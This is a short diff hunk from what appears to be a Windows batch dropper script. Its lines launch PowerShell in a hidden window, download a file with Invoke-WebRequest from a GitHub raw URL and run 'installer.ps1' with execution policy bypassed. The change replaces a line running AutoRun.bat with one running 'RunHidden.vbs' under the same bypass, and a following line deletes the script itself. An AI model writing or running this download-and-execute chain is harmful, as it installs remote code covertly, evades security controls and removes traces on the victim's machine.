@@ -40,6 +40,6 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
 
-powershell -ExecutionPolicy Bypass ./AutoRun.bat
+powershell powershell.exe -ExecutionPolicy Bypass ./RunHidden.vbs
 @REM self delete
 del wget.cmd
